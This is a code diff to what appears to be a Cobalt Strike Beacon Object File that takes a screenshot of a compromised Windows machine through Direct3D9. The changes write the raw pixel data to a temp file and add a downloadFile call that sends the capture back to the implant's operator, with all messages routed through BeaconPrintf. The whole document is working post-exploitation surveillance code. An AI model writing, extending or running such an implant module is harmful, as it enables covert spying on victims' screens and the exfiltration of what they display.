@@ -6,6 +6,7 @@
 WINBASEAPI void __cdecl MSVCRT$free(void* memblock);
 WINBASEAPI void* __cdecl MSVCRT$malloc(size_t _Size);
 WINBASEAPI int __cdecl MSVCRT$printf(const char* _Format, ...);
+DECLSPEC_IMPORT char* WINAPI MSVCRT$getenv(const wchar_t *varname);
 WINBASEAPI int __cdecl MSVCRT$fclose(FILE *_File);
 WINBASEAPI size_t __cdecl MSVCRT$fwrite(const void* _Str, size_t _Size, size_t _Count, FILE* _File);
 WINBASEAPI FILE* WINAPI MSVCRT$fopen(const char* filename, const char* mode);
@@ -15,19 +16,32 @@ DECLSPEC_IMPORT IDirect3D9* WINAPI D3D9$Direct3DCreate9(UINT SDKVersion);
 #define RELEASE(x) if (x) { x->lpVtbl->Release(x); x = NULL; }
 
 void SavePixelsToLogFile(int width, int height, int pitch, LPVOID pBits) {
-    MSVCRT$printf("%doo%d.log\n", width, height);
-    char fileName[256];
-    MSVCRT$sprintf(fileName, "%doo%d.log", width, height);
+    char fileName[MAX_PATH];
+    char *tempPath = MSVCRT$getenv("TEMP");
+
+    if (tempPath == NULL) {
+        BeaconPrintf(CALLBACK_OUTPUT,"Failed to get temporary path, using current directory\n");
+        MSVCRT$sprintf(fileName, "%doo%d.tmp", width, height);
+    } else {
+        MSVCRT$sprintf(fileName, "%s\\%doo%d.tmp", tempPath, width, height);
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT,"Output path: %s\n", fileName);
+
     FILE* file = MSVCRT$fopen(fileName, "wb");
     if (file == NULL) {
-        MSVCRT$printf("Failed to open file for writing: %s\n", fileName);
+        BeaconPrintf(CALLBACK_OUTPUT,"Failed to open file for writing: %s\n", fileName);
         return;
     }
+
     size_t bytesWritten = MSVCRT$fwrite(pBits, pitch * height, 1, file);
     if (bytesWritten != 1) {
-        MSVCRT$printf("Failed to write pixel data to file: %s\n", fileName);
+        BeaconPrintf(CALLBACK_OUTPUT,"Failed to write pixel data to file: %s\n", fileName);
     }
+
     MSVCRT$fclose(file);
+    downloadFile(fileName, MSVCRT$strlen(fileName), pBits, pitch * height);
+    return;
 }
 
 // BOF entry function
@@ -66,18 +80,18 @@ int go() {
 
     hr = pDevice->lpVtbl->CreateOffscreenPlainSurface(pDevice, mode.Width, mode.Height, D3DFMT_A8R8G8B8, D3DPOOL_SYSTEMMEM, &surface, NULL);
     if (FAILED(hr)) {
-        MSVCRT$printf("CreateOffscreenPlainSurface Failed!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "CreateOffscreenPlainSurface Failed!\n");
         return 0;
     }
     hr = surface->lpVtbl->LockRect(surface, &rc, NULL, 0);
     if (FAILED(hr)) {
-        MSVCRT$printf("LockRect Failed!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "LockRect Failed!\n");
         return 0;
     }
     pitch = rc.Pitch;
     hr = surface->lpVtbl->UnlockRect(surface);
     if (FAILED(hr)) {
-        MSVCRT$printf("UnlockRect Failed!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "UnlockRect Failed!\n");
         return 0;
     }
     shots = (LPBYTE*)MSVCRT$malloc(1 * sizeof(LPBYTE));
